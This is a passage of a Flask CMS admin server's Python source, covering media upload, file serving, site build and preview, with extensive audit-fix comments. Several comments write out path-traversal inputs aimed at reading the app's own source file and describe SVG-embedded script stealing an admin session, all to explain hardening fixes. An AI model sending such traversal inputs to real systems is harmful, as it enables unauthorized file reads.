    # pointing at a category that no longer exists. Clean that up here,
    # where all three manifests are actually in scope.
    #
    # AUDIT FIX (DAT-02, minimum remediation): the category record is
    # already gone by the time this loop runs — if the process is killed
    # partway through (a real risk on a phone-hosted app: backgrounding,
    # OOM, force-stop), some pages/posts silently keep a category_id_fk
    # pointing at nothing, with no record anywhere that the cleanup was
    # incomplete. A full two-phase/transactional fix is a bigger design
    # change (this MFDB format has no cross-file transaction primitive);
    # the audit's own suggested floor — never let this fail silently, log
    # it loudly if it does — is what's implemented here. The delete
    # itself still succeeds and returns 200 even if cleanup hits an
    # error: the category is genuinely gone either way, and refusing to
    # report success would be worse (the operator has no retry action
    # available for a half-finished cleanup regardless).
    cleanup_errors = []
    for page in CmsContent.management_cms_content_list_pages(str(CMS_MANIFESTS["cms_page"])):
        if page.get("category_id_fk") == cid:
            try:
                CmsContent.management_cms_content_update_page(str(CMS_MANIFESTS["cms_page"]), page["id"], category_id_fk=None)
            except Exception as e:
                cleanup_errors.append(f"page {page.get('id')}: {e}")
    for post in CmsContent.management_cms_content_list_posts(str(CMS_MANIFESTS["cms_post"]), status=None):
        if post.get("category_id_fk") == cid:
            try:
                CmsContent.management_cms_content_update_post(str(CMS_MANIFESTS["cms_post"]), post["id"], category_id_fk=None)
            except Exception as e:
                cleanup_errors.append(f"post {post.get('id')}: {e}")
    if cleanup_errors:
        log.error(
            "delete_category(%s): category deleted, but %d orphaned category_id_fk "
            "cleanup(s) failed and were left dangling: %s",
            cid, len(cleanup_errors), "; ".join(cleanup_errors),
        )
    return jsonify({"ok": True})

# ADMIN NAV (hierarchical site navigation — lib_bejson_Management_nav.py, lives
# in PAGES_MANIFEST as a secondary NavLink entity, NOT the CMS Content/Nav
# manifest, per the module's own docstring on why the two are kept separate)

@app.route("/api/nav", methods=["GET"])
def list_nav():
    return jsonify({"nav": [navlink_to_dict(r) for r in NavLib.management_nav_list(str(PAGES_MANIFEST))]})

def _navlink_tree_to_dict(nodes):
    # BUG FIX: management_nav_get_tree() returns raw library field names
    # (nav_label, nav_url, nav_active) since it operates directly on
    # MFDBCore rows — unlike /api/nav (list_nav()), this route previously
    # returned that raw shape straight through instead of translating it
    # via navlink_to_dict(), so every tree node's label/url came back
    # undefined in the frontend, rendering blank despite real data
    # existing underneath. Recurses through "children" since the tree is
    # nested.
    result = []
    for n in nodes:
        d = navlink_to_dict(n)
        d["children"] = _navlink_tree_to_dict(n.get("children", []))
        result.append(d)
    return result

@app.route("/api/nav/tree", methods=["GET"])
def nav_tree():
    return jsonify({"tree": _navlink_tree_to_dict(NavLib.management_nav_get_tree(str(PAGES_MANIFEST)))})

@app.route("/api/nav", methods=["POST"])
def create_nav():
    d = request.get_json(silent=True) or {}
    if not d.get("label") or not d.get("url"):
        return jsonify({"error": "label and url are required"}), 400
    nid = NavLib.management_nav_add(
        str(PAGES_MANIFEST), d["label"], d["url"], target=d.get("target", "_self"),
        parent_id=d.get("parent_id"), position=d.get("position"), active=d.get("active", True),
    )
    return jsonify({"ok": True, "id": nid})

@app.route("/api/nav/<nid>", methods=["PUT"])
def update_nav(nid):
    d = request.get_json(silent=True) or {}
    fields = {}
    if "label" in d: fields["nav_label"] = d["label"]
    if "url" in d: fields["nav_url"] = d["url"]
    if "target" in d: fields["nav_target"] = d["target"]
    if "parent_id" in d: fields["parent_id"] = d["parent_id"]
    if "active" in d: fields["nav_active"] = d["active"]
    if not NavLib.management_nav_update(str(PAGES_MANIFEST), nid, **fields):
        return jsonify({"error": "Not found"}), 404
    return jsonify({"ok": True})

@app.route("/api/nav/<nid>", methods=["DELETE"])
def delete_nav(nid):
    if not NavLib.management_nav_delete(str(PAGES_MANIFEST), nid):
        return jsonify({"error": "Not found"}), 404
    return jsonify({"ok": True})

@app.route("/api/nav/reorder", methods=["POST"])
def reorder_nav():
    d = request.get_json(silent=True) or {}
    NavLib.management_nav_reorder(str(PAGES_MANIFEST), d.get("nav_id_order", []))
    return jsonify({"ok": True})

# MEDIA UPLOAD
#
# Registers into BOTH stores on upload, since the two exist for different
# reasons and neither alone covers both jobs this app needs:
#   - PAGES_MANIFEST's admin "Media" entity (via lib_bejson_Management_media,
#     the function OFFICIAL_PLAN.MD's Phase 2.3 names literally) — the
#     general-purpose admin media library, richer schema (file_type,
#     dimensions), used by any admin-side feature that lists uploaded files.
#   - CMS_MANIFESTS["cms_media"] (via lib_bejson_Management_media_cms) — the
#     public-hosting layer's own Media entity, which is what
#     management_cms_static_build()'s _management_cms_copy_media() step
#     reads from when publishing. Skipping this one would mean uploaded
#     images never make it into a built site's /media/ folder.
# Both calls hash the same file independently (cheap; these are typically
# small image uploads) rather than sharing one media_id across two different
# schemas that don't agree on a primary-key field name ("media_id" vs "id").

UPLOADS_DIR = SCRIPT_PATH / "Content" / "media" / "uploads"

# AUDIT FIX (H-4): extension allow-list + magic-byte sniff table. Kept
# deliberately small — the media library is images/video/audio/PDF, not a
# general file store. Extend intentionally, not by widening a catch-all.
_EXTENSION_CATEGORY = {
    ".jpg": "image", ".jpeg": "image", ".png": "image", ".gif": "image",
    ".webp": "image", ".svg": "image",
    ".mp4": "video", ".webm": "video", ".mov": "video",
    ".mp3": "audio", ".wav": "audio", ".ogg": "audio",
    ".pdf": "document",
}
_ALLOWED_UPLOAD_EXTENSIONS = frozenset(_EXTENSION_CATEGORY)

def _sniff_file_type(head: bytes):
    """Identify a file's real category from its leading bytes (magic
    numbers), independent of client-supplied filename/mimetype. Returns
    None (not "unknown") for formats we don't have a signature for
    (.svg/.ogg — text/container formats without a reliable fixed magic
    number here), so callers can choose to trust the extension for those
    rather than falsely flagging them as mismatched."""
    if head.startswith(b"\xff\xd8\xff"):
        return "image"          # JPEG
    if head.startswith(b"\x89PNG\r\n\x1a\n"):
        return "image"          # PNG
    if head.startswith((b"GIF87a", b"GIF89a")):
        return "image"          # GIF
    if head.startswith(b"RIFF") and head[8:12] == b"WEBP":
        return "image"          # WebP
    if head.startswith(b"RIFF") and head[8:12] == b"WAVE":
        return "audio"          # WAV
    if head.startswith(b"ID3") or head[:2] in (b"\xff\xfb", b"\xff\xf3", b"\xff\xf2"):
        return "audio"          # MP3
    if head.startswith(b"%PDF-"):
        return "document"       # PDF
    if head[4:8] == b"ftyp":
        return "video"          # MP4/MOV family (ISO base media file format)
    if head.startswith(b"\x1aE\xdf\xa3"):
        return "video"          # WebM/Matroska
    return None

@app.route("/media-files/<path:filename>", methods=["GET"])
def serve_media_file(filename):
    # BUG FIX: the <path:filename> converter permits "/" and ".." segments
    # in the URL, and this route previously joined that raw value straight
    # onto UPLOADS_DIR with no containment check — a real arbitrary-file-read
    # vulnerability (e.g. GET /media-files/../../app.py). bejson_safe_join()
    # (already hardened against the sibling-prefix bypass — see its own
    # BUG FIX note) raises ValueError on any attempt to escape UPLOADS_DIR.
    try:
        safe_path = Path(bejson_safe_join(str(UPLOADS_DIR), filename))
    except ValueError:
        return jsonify({"error": "Not found"}), 404
    # AUDIT FIX (SEC-03): .svg is upload-allow-listed (H-4) but
    # _sniff_file_type() has no magic-number signature for SVG (it's
    # XML-based text, not a fixed binary header), so an SVG is trusted on
    # extension alone. An SVG can carry an embedded <script> — served
    # inline via plain send_file() (as this route did before), navigating
    # straight to /media-files/x.svg would execute that script in this
    # app's own origin, with access to the admin's session/cookie. Two
    # independent mitigations, both still useful even if one is bypassed:
    # Content-Security-Policy blocks the SVG's own script from doing
    # anything even if it runs, and Content-Disposition: attachment stops
    # the browser from rendering it as a top-level document if someone
    # navigates straight to the URL (an <img>/<picture> embed still
    # renders normally — that header only governs top-level navigation
    # behavior in every mainstream browser, not subresource loads).
    if safe_path.suffix.lower() == ".svg":
        resp = send_file(str(safe_path), mimetype="image/svg+xml")
        resp.headers["Content-Security-Policy"] = "default-src 'none'"
        resp.headers["Content-Disposition"] = "attachment"
        return resp
    return send_file(str(safe_path))

@app.route("/api/media/upload", methods=["POST"])
def upload_media():
    f = request.files.get("file")
    if not f or not f.filename:
        return jsonify({"error": "No file provided"}), 400

    # BUG FIX: f.filename comes straight from the client's multipart request
    # and is not sanitized by Flask/Werkzeug automatically — using it raw in
    # a path join is a real path-traversal risk (a crafted filename like
    # "../../../app.py" could escape UPLOADS_DIR entirely), the same
    # vulnerability class as the Zip Slip issue fixed earlier in
    # lib_bejson_Core_bejson_path_guard.py. secure_filename() strips
    # directory components and unsafe characters.
    safe_filename = secure_filename(f.filename)
    if not safe_filename:
        return jsonify({"error": "Invalid filename"}), 400

    # AUDIT FIX (H-4): upload validation was entirely trust-based — no
    # extension allow-list, and file_type was derived purely from the
    # client-supplied f.mimetype (spoofable by anything sending the
    # request). MAX_CONTENT_LENGTH (app.config, set near Flask app
    # creation) now caps request-body size for the resource-exhaustion
    # half of this finding. This half handles content-type spoofing:
    # 1) reject any extension outside the allow-list, 2) sniff the first
    # bytes against known magic numbers and use THAT for file_type instead
    # of trusting f.mimetype, 3) for the types we can positively identify,
    # reject a mismatch between the claimed extension's category and the
    # sniffed category outright (e.g. a ".jpg" that's actually an .exe).
    _ext = os.path.splitext(safe_filename)[1].lower()
    if _ext not in _ALLOWED_UPLOAD_EXTENSIONS:
        return jsonify({"error": f"File type '{_ext}' is not allowed"}), 400

    _head = f.stream.read(64)
    f.stream.seek(0)
    sniffed_type = _sniff_file_type(_head)
    claimed_category = _EXTENSION_CATEGORY.get(_ext)
    if sniffed_type is not None and claimed_category is not None and sniffed_type != claimed_category:
        return jsonify({
            "error": f"File content does not match its '{_ext}' extension "
                      f"(looks like {sniffed_type}, not {claimed_category})"
        }), 400
    file_type = sniffed_type or claimed_category or "document"

    UPLOADS_DIR.mkdir(parents=True, exist_ok=True)
    dest = UPLOADS_DIR / safe_filename

    # BUG FIX: previously always wrote to UPLOADS_DIR / f.filename, silently
    # overwriting any existing file with the same name — including its WebP
    # sibling on disk — while the OLD database row (media_id, file_hash,
    # file_size_bytes, webp_path) stayed exactly as it was, now describing
    # content that was no longer actually on disk. Two different uploads
    # that happen to share a filename must not corrupt each other's record.
    # De-duplicates by appending a short counter suffix before the
    # extension until the target path is free.
    if dest.exists():
        stem, suffix = os.path.splitext(safe_filename)
        counter = 1
        while dest.exists():
            dest = UPLOADS_DIR / f"{stem}-{counter}{suffix}"
            counter += 1
        safe_filename = dest.name

    f.save(str(dest))

    # AUDIT FIX (H-4): mime_type is still recorded (useful metadata for the
    # media library UI), but file_type — the field that drives what the
    # app treats the upload AS — now comes from the sniff/extension check
    # above, not from the client-controlled f.mimetype.
    mime_type = f.mimetype or "application/octet-stream"
    alt_text = request.form.get("alt_text", "")

    admin_media_id = MediaLib.management_media_add(
        str(PAGES_MANIFEST), safe_filename, str(dest), file_type=file_type,
        mime_type=mime_type, file_size_bytes=dest.stat().st_size, alt_text=alt_text,
    )
    # AUDIT FIX (DAT-03): pass the real admin_media_id through so the
    # sibling CmsMedia record has an actual foreign key back to it,
    # instead of the two only ever being joinable by coincidentally
    # sharing the same original_path string.
    CmsMedia.management_cms_media_add(
        str(CMS_MANIFESTS["cms_media"]), safe_filename, str(dest), mime_type=mime_type,
        alt_text=alt_text, admin_media_id=admin_media_id,
    )
    record = MediaLib.management_media_get(str(PAGES_MANIFEST), admin_media_id)
    return jsonify({"ok": True, "media": admin_media_to_dict(record)})

@app.route("/api/media", methods=["GET"])
def list_media():
    return jsonify({"media": [admin_media_to_dict(r) for r in MediaLib.management_media_list(str(PAGES_MANIFEST))]})

@app.route("/api/media/<mid>", methods=["DELETE"])
def delete_media(mid):
    # AUDIT FIX (2026-07-26): this route previously only called
    # management_media_delete(), which itself only ever removed the MFDB
    # row — the physical file (and its WebP sibling) stayed on disk
    # forever, a permanent storage leak on every "delete". It also never
    # touched the CmsMedia record created alongside it in
    # upload_media()/add_external_media() (a separate, independently
    # generated media_id — the two Media bookkeeping systems have no
    # shared foreign key, only the same original_path/external_url by
    # coincidence of both being created from the same upload). Now: look
    # up the record BEFORE deleting it so its original_path/webp_path are
    # still available, delete both files if present (missing files are
    # not an error — nothing to clean up), then find and delete the
    # matching CmsMedia record by original_path match (the only link
    # available) so it doesn't survive as an orphan pointing at a file
    # that's actually gone.
    record = MediaLib.management_media_get(str(PAGES_MANIFEST), mid)
    if not record:
        return jsonify({"error": "Not found"}), 404

    for path_field in ("original_path", "webp_path"):
        p = record.get(path_field)
        if p:
            # AUDIT FIX (H-4): p is expected to be a real filesystem path
            # here (that's the whole point — we're about to unlink it),
            # but older records may have it stored as an absolute
            # device-specific path from before the H-4 portability fix, or
            # (after that fix) project-relative. os.path.isabs() picks the
            # right anchor either way; SCRIPT_PATH is this run's own
            # freshly self-resolved absolute project root.
            fp = p if os.path.isabs(p) else str(SCRIPT_PATH / p)
            try:
                Path(fp).unlink(missing_ok=True)
            except OSError:
                pass  # best-effort cleanup; don't fail the delete over a filesystem hiccup

    if not MediaLib.management_media_delete(str(PAGES_MANIFEST), mid):
        return jsonify({"error": "Not found"}), 404

    # AUDIT FIX (DAT-03): match by the real admin_media_id FK first (set
    # on every upload since that fix); fall back to the old
    # original_path string match only for records created before this
    # field existed, so nothing already in the wild becomes unjoinable.
    cms_records = CmsMedia.management_cms_media_list(str(CMS_MANIFESTS["cms_media"]))
    matched = next((r for r in cms_records if r.get("admin_media_id") == mid), None)
    if not matched:
        original_path = record.get("original_path")
        if original_path:
            matched = next((r for r in cms_records if r.get("original_path") == original_path), None)
    if matched:
        CmsMedia.management_cms_media_delete(str(CMS_MANIFESTS["cms_media"]), matched.get("id"))

    return jsonify({"ok": True})

@app.route("/api/media/external", methods=["POST"])
def add_external_media():
    d = request.get_json(silent=True) or {}
    media_type = d.get("media_type")
    url = (d.get("url") or "").strip()
    if media_type not in ("youtube", "external_image"):
        return jsonify({"error": "media_type must be 'youtube' or 'external_image'"}), 400
    if not url:
        return jsonify({"error": "url is required"}), 400
    try:
        media_id = MediaLib.management_media_add_external(
            str(PAGES_MANIFEST), media_type, url,
            title=d.get("title", ""), alt_text=d.get("alt_text", ""),
        )
    except ValueError as e:
        return jsonify({"error": str(e)}), 400
    record = MediaLib.management_media_get(str(PAGES_MANIFEST), media_id)
    return jsonify({"ok": True, "media": admin_media_to_dict(record)})

# CMS: registries + tags (needed by the Pages/Posts editor UI)

@app.route("/api/page-types", methods=["GET"])
def get_page_types():
    return jsonify({"page_types": CmsTaxonomy.management_cms_taxonomy_list_page_types()})

@app.route("/api/post-statuses", methods=["GET"])
def get_post_statuses():
    return jsonify({"post_statuses": CmsTaxonomy.management_cms_taxonomy_list_post_statuses()})

@app.route("/api/tags", methods=["GET"])
def list_tags():
    return jsonify({"tags": CmsTaxonomy.management_cms_taxonomy_get_tags(str(CMS_MANIFESTS["cms_post"]))})

@app.route("/api/tags", methods=["POST"])
def create_tag():
    d = request.get_json(silent=True) or {}
    if not d.get("name"):
        return jsonify({"error": "name is required"}), 400
    tid = CmsTaxonomy.management_cms_taxonomy_add_tag(str(CMS_MANIFESTS["cms_post"]), d["name"])
    return jsonify({"ok": True, "id": tid})

@app.route("/api/tags/<tag_id>", methods=["DELETE"])
def delete_tag(tag_id):
    # Audit item 5: tags were previously add-only from the UI. The backend
    # function (management_cms_taxonomy_delete_tag, with orphan tag_ids
    # cleanup — see that function's docstring) already existed; this route
    # was simply missing.
    ok = CmsTaxonomy.management_cms_taxonomy_delete_tag(str(CMS_MANIFESTS["cms_post"]), tag_id)
    if not ok:
        return jsonify({"error": "tag not found"}), 404
    return jsonify({"ok": True})

# CONFIG

@app.route("/api/config", methods=["GET"])
def get_config():
    return jsonify({"settings": Config.management_config_get_settings_list(SCRIPT_PATH)})

@app.route("/api/config", methods=["POST"])
def update_config():
    data = request.get_json(silent=True) or {}
    Config.management_config_save(SCRIPT_PATH, data)
    return jsonify({"ok": True})

# FACTORY RESET
#
# Requires the exact confirmation string server-side, as defense-in-depth
# beyond the UI's own confirm-tab flow (a stray/duplicate click on the
# client can't trigger this by accident — the request body itself has to
# carry the confirmation).

@app.route("/api/factory-reset", methods=["POST"])
def factory_reset():
    data = request.get_json(silent=True) or {}
    if data.get("confirm") != "RESET":
        return jsonify({"error": "Confirmation phrase did not match. Nothing was reset."}), 400
    result = _factory_reset()
    return jsonify({"ok": True, **result})

# BUILD
#
# Per Phase 3 / addendum Q5: full replacement, not additive. The old
# Notes/Tasks/Links-driven personal-dashboard export
# (management_build_render_homepage / management_build_write_export in
# lib_bejson_Management_build.py) is no longer called by any route in THIS
# file. DEAD CODE FIX (2026-07-21): this file's own `import
# lib_bejson_Management_build as Build` was therefore genuinely unused and
# has been removed. The library itself is NOT dead code, though — a prior
# comment here incorrectly implied the whole module was orphaned;
# lib_bejson_Management_cli.py (the Termux CLI menu) still calls both
# functions directly for its own export path, so the library file was left
# untouched per Library Immutability — only this app.py's redundant import
# of it was removed.
#
# BUG FIX: the build used to run synchronously inside the request handler
# with NO error handling at all — any exception (e.g.
# ManagementCmsMissingComponentError on a stale/never-restarted app
# instance, or anything else) propagated as an unhandled Flask 500 with no
# clear message reaching the UI, and on a slow/low-power device a large
# build risked exceeding a mobile WebView's request timeout entirely,
# which can look exactly like "it errored" with no useful detail. Adapted
# the async build + status-polling pattern from a reference CMS
# (Flask_CMS_Publisher.py's r_build()/r_log(): kick the build off in a
# background thread, return immediately, poll a status endpoint for
# progress/result) — not copied verbatim, but the same underlying idea,
# applied to this app's own MFDB/StaticBuilder architecture. Every
# exception is now caught, logged with its full traceback, and surfaced
# through /api/build/status in a form the UI can actually show the user.

_BUILD_STATE = {"running": False, "log": [], "result": None, "error": None, "error_type": None}
_BUILD_LOCK = threading.Lock()

def _build_log(message: str) -> None:
    """AUDIT FIX (M-5): every _BUILD_STATE mutation funnels through this
    (and _build_set below) so no write happens outside _BUILD_LOCK."""
    with _BUILD_LOCK:
        _BUILD_STATE["log"].append(message)

def _build_set(**kwargs) -> None:
    with _BUILD_LOCK:
        _BUILD_STATE.update(kwargs)

def _run_build_in_background():
    # BUG FIX: "running" is now set to True by the route handler, under
    # _BUILD_LOCK, before this thread is even started — see build_homepage()
    # below. Setting it here (as this used to do) left a real window between
    # the route's guard check and the flag actually being set, during which
    # two near-simultaneous POST /api/build requests could both pass the
    # guard and start two concurrent builds writing to the same shared
    # _BUILD_STATE dict and the same Export/ directory.
    # AUDIT FIX (M-5): _BUILD_STATE is written under _BUILD_LOCK at start
    # (see build_homepage()'s guard), but every mutation below this point
    # used to happen with no lock at all while /api/build/status read the
    # same dict concurrently from the request thread — benign for single
    # key writes in CPython today, but "result" could be observed set
    # before "running" flips to False, a real mid-transition read. Every
    # write to _BUILD_STATE in this worker now happens under _BUILD_LOCK.
    _build_set(log=["Build started…"], result=None, error=None, error_type=None)
    try:
        cfg = Config.management_config_load(SCRIPT_PATH)
        # AUDIT FIX (M-2): _site_url is written under _BUILD_LOCK in
        # build_homepage() before this thread starts; read it under the
        # same lock here so no _BUILD_STATE access ever bypasses the lock.
        with _BUILD_LOCK:
            resolved_site_url = _BUILD_STATE.get("_site_url", "")
        site_config = {
            "site_title": cfg.get("site_title", "My Homepage"),
            "site_tagline": cfg.get("site_subtitle", ""),
            "footer_text": cfg.get("footer_text", ""),
            "site_url": resolved_site_url,
            "feed_posts_limit": 20,
        }
        _build_log("Resolved site config.")
        result = StaticBuilder.management_cms_static_build(
            str(CMS_MANIFESTS["cms_page"]), str(CMS_MANIFESTS["cms_post"]),
            str(CMS_MANIFESTS["cms_category"]),
            str(CMS_MANIFESTS["cms_media"]), site_config, str(SCRIPT_PATH / "Export"),
            root_manifest_path=str(ROOT_MANIFEST),
            # BUG FIX: this used to be omitted entirely, meaning
            # management_cms_static_build() rendered nav from the CMS-layer
            # manifest above (cms_nav) — which nothing in this app ever
            # writes to — instead of PAGES_MANIFEST, where the "Site Nav"
            # panel's actual data lives. Every build silently produced a
            # site with no navigation menu regardless of what was
            # configured. See that function's own docstring for the fuller
            # explanation.
            admin_nav_manifest_path=str(PAGES_MANIFEST),
        )
        for w in result.get("warnings", []):
            _build_log(f"WARNING: {w}")
        _build_log(
            f"Build complete: {result['pages']} page(s), {result['posts']} post(s), "
            f"{result['category_pages']} category page(s), {result['tag_pages']} tag page(s), "
            f"{result['media_copied']} media file(s)."
        )
        _build_set(result=result)
    except Exception as e:
        tb = traceback.format_exc()
        _build_log(f"ERROR: {e}")
        _build_log(tb)
        _build_set(error=str(e), error_type=type(e).__name__)
        log.error("Build failed: %s\n%s", e, tb)  # also surfaces in the server log for local debugging
    finally:
        _build_set(running=False)

@app.route("/api/build", methods=["POST"])
def build_homepage():
    with _BUILD_LOCK:
        if _BUILD_STATE["running"]:
            return jsonify({"ok": False, "error": "A build is already running."}), 409
        _BUILD_STATE["running"] = True
    # site_url has no dedicated Settings field today (see prior note) — captured
    # here, at request time, since request.host_url isn't available from a
    # background thread (no active Flask request context there).
    _build_set(_site_url=request.host_url.rstrip("/"))
    thread = threading.Thread(target=_run_build_in_background, daemon=True)
    thread.start()
    return jsonify({"ok": True, "started": True})

@app.route("/api/build/status", methods=["GET"])
def build_status():
    # AUDIT FIX (M-5): snapshot every field under one lock acquisition so
    # the response can't straddle a mid-transition write (e.g. "result"
    # already set while "running" hasn't flipped to False yet).
    with _BUILD_LOCK:
        snapshot = dict(_BUILD_STATE)
    return jsonify({
        "running": snapshot["running"],
        "result": snapshot["result"],
        "error": snapshot["error"],
        "error_type": snapshot["error_type"],
        "log": snapshot["log"][-100:],
    })

@app.route("/api/build/download", methods=["GET"])
def download_homepage():
    # AUDIT FIX (M-6): this only ever served Export/index.html — a
    # multi-page/multi-file build (which every real build produces: post
    # pages, category archives, feeds, sitemap, robots.txt, media) was
    # silently truncated to just the homepage on download, with no error
    # or indication anything was missing. Confirmed against a live note
    # from Elton ("the download button only downloads the index page it
    # should be allowing you to download the zip file everything") dated
    # after the prior audit passes — still unfixed until now. Zips the
    # entire Export/ tree in memory and serves that instead.
    export_dir = SCRIPT_PATH / "Export"
    if not export_dir.exists() or not any(export_dir.iterdir()):
        return jsonify({"error": "No export yet — click Build first"}), 404
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for file_path in export_dir.rglob("*"):
            if file_path.is_file():
                zf.write(file_path, arcname=file_path.relative_to(export_dir))
    buf.seek(0)
    return send_file(buf, as_attachment=True, download_name="Export.zip", mimetype="application/zip")

# PREVIEW
#
# Serves the built Export/ directory back through this same running app
# rather than spinning up a second server process — a separate process
# would need its own port allocation and lifecycle management, which is
# more fragile than necessary (especially on Android/Termux) for what's
# ultimately just "serve some static files," and a route on the existing
# app achieves the identical practical result.
#
# The one real wrinkle: management_cms_static_build() writes internal
# links as root-relative paths (e.g. "/about-us.html", "/feed.xml") so the
# exported site works correctly when deployed to a real domain root. Serve
# those same files back under /preview/ unmodified and every internal
# link would resolve to the app's OWN root instead of staying inside the
# preview — clicking a link would jump out of the preview overlay
# entirely. Fixed by injecting <base href="/preview/"> into every HTML
# page as it's served, so the browser resolves every root-relative link,
# image, and stylesheet reference against /preview/ instead.

EXPORT_DIR = SCRIPT_PATH / "Export"

def _rewrite_preview_html(html: str) -> str:
    """
    Shared by every HTML response serve_preview() returns (a real
    exported page, or the 404 fallback) so both get identical treatment
    — factored out after almost duplicating this logic for the 404
    fallback below and catching that a copy-paste would silently miss
    the same absolute-path bug this exact function was written to fix.
    """
    lower_html = html.lower()
    head_idx = lower_html.find("<head")
    if head_idx != -1:
        tag_end = html.find(">", head_idx)
        if tag_end != -1:
            html = html[:tag_end + 1] + '<base href="/preview/">' + html[tag_end + 1:]
    # BUG FIX: reported as "broken images and links" in the sidebar.
    # <base href="/preview/"> only ever rewrites RELATIVE URLs — every
    # link/image/feed URL this app's own static builder generates
    # (post/page/category/tag/media, all of it) is absolute
    # ("/post/...", "/media/...", by deliberate, consistent design —
    # the site is meant to be deployed at a real domain's root, where
    # that's exactly correct). An absolute href/src ignores <base>
    # entirely and resolves against the actual origin, so clicking a
    # sidebar link inside this preview iframe navigated to
    # http://host:port/post/... — a real top-level route that doesn't
    # exist — 404. Reproduced and confirmed via Playwright before
    # fixing: clicked a real nav link, landed on a genuine 404 page.
    # Root-caused as a general problem (not just the one media path
    # that happened to also break), so the fix is general: rewrite
    # every href="/..."/src="/..." that isn't already under /preview/
    # and isn't protocol-relative ("//host/...", a different origin)
    # to be under /preview/ too, so the entire absolute-path
    # convention stays inside the sandbox this route serves.
    return re.sub(r'((?:href|src)=")/(?!/|preview/)', r'\1/preview/', html)


@app.route("/preview/", methods=["GET"])
@app.route("/preview/<path:filename>", methods=["GET"])
def serve_preview(filename="index.html"):
    if not filename or filename.endswith("/"):
        filename += "index.html"
    try:
        safe_path = Path(bejson_safe_join(str(EXPORT_DIR), filename))
    except ValueError:
        return jsonify({"error": "Not found"}), 404

    if not safe_path.exists():
        # Feature request (Elton): custom 404 page. Distinguishes "never
        # built at all" (EXPORT_DIR itself missing/empty — the existing
        # message still makes sense there) from "site is built, this one
        # path just doesn't exist" (the real 404 case) — the latter now
        # serves the actual Export/404.html a real static host would
        # show, run through the same _rewrite_preview_html() as every
        # other previewed page (its own nav links need to stay inside
        # the /preview/ sandbox too, same as any other page), so the
        # in-app preview matches real deployed behavior instead of only
        # ever showing a generic JSON error.
        custom_404 = EXPORT_DIR / "404.html"
        if EXPORT_DIR.is_dir() and any(EXPORT_DIR.iterdir()) and custom_404.exists():
            html_404 = _rewrite_preview_html(custom_404.read_text(encoding="utf-8"))
            return Response(html_404, status=404, mimetype="text/html")
        return jsonify({"error": "Not found — build the site first"}), 404

    if safe_path.suffix.lower() in (".html", ".htm"):
        html = _rewrite_preview_html(safe_path.read_text(encoding="utf-8"))
        return Response(html, mimetype="text/html")

    return send_file(str(safe_path))

if __name__ == "__main__":
    cfg = Config.management_config_load(SCRIPT_PATH)
    port = cfg.get("port", 5030)
    # AUDIT FIX (H-1): defaulted to 0.0.0.0 (every interface, reachable by
    # anything on the LAN) with zero auth — now defaults to loopback-only.
    # Set MANAGEMENT_CMS_HOST=0.0.0.0 explicitly (e.g. to reach the
    # dashboard from another device on the same network) — combined with
    # the token gate above, that's now an informed opt-in, not the default.
    host = os.environ.get("MANAGEMENT_CMS_HOST", cfg.get("host", "127.0.0.1"))
    if AUTH_DISABLED:
        # AUDIT FIX (SEC-08): the log.warning() below documented the risk
        # but didn't stop it — nothing actually prevented
        # MANAGEMENT_CMS_NO_AUTH=1 combined with a non-loopback
        # MANAGEMENT_CMS_HOST, which is a fully unauthenticated,
        # network-exposed admin panel (including factory reset) reachable
        # by anything on the LAN. That combination is refused outright now
        # rather than merely logged; loopback + NO_AUTH is still allowed
        # (a deliberate, still-risky-but-locally-scoped opt-out for local
        # debugging), non-loopback + auth-enabled is unaffected.
        if host not in ("127.0.0.1", "localhost", "::1"):
            sys.exit(
                "Refusing to start: MANAGEMENT_CMS_NO_AUTH=1 combined with a "
                f"non-loopback MANAGEMENT_CMS_HOST ({host!r}) would expose a "
                "fully unauthenticated admin panel — including factory reset — "
                "to the network. Either drop MANAGEMENT_CMS_NO_AUTH, or bind to "
                "127.0.0.1 instead."
            )
        log.warning("MANAGEMENT_CMS_NO_AUTH=1 — running with NO admin-token auth.")

    # AUDIT FIX (N-3): factory-reset backups (Persist/factory_reset_backups/
    # <timestamp>/) and migration archives (Persist/_migrated_archive/
    # <timestamp>/) accumulate indefinitely by design — backup-never-delete
    # is a deliberate policy, not a bug — but that means nothing else ever
    # tells the operator how much space they're using on a phone-storage
    # device. Soft advisory only: a log line above a size threshold, never
    # an automatic deletion. Failure here (missing dir, permission error,
    # etc.) must never block startup, so it's wrapped and swallowed.
    try:
        _persist_dir = SCRIPT_PATH / "Persist"
        if _persist_dir.is_dir():
            _snapshot_dirs = [d for d in _persist_dir.glob("*/*") if d.is_dir()]
            _total_bytes = sum(f.stat().st_size for d in _snapshot_dirs for f in d.rglob("*") if f.is_file())
            _threshold_bytes = 500 * 1024 * 1024  # 500 MB — generous for a solo-admin phone deployment
            if _total_bytes >= _threshold_bytes:
                log.info(
                    "Persist/ snapshots total %.1f MB across %d backup(s) — "
                    "backups are never auto-deleted by design; review "
                    "Persist/factory_reset_backups/ and Persist/_migrated_archive/ "
                    "manually if storage is tight.",
                    _total_bytes / (1024 * 1024), len(_snapshot_dirs),
                )
    except OSError:
        pass

    log.info("Management_CMS v%s — http://%s:%s  (admin token: %s)",
              VERSION, host, port,
              "disabled" if AUTH_DISABLED else str(_TOKEN_FILE))
    app.run(host=host, port=port, debug=False, threaded=True)
